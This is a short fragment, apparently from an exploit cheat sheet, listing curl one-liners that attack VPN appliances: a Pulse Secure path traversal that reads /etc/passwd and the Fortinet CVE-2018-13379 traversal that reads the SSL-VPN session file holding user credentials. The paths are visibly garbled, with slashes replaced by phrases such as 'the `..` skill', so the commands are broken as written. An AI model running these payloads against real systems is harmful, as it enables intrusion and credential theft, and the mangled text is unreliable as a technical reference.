...
curl -k "https://vpn.target.com/dana-na/the `dana` skillhtml5acc/guacamole/the `..` skillthe `etc` skillpasswd?/dana/html5acc/guacamole/"

# Fortinet VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/the `..` skillthe `..` skill/////////dev/cmdb/sslvpn_websession"
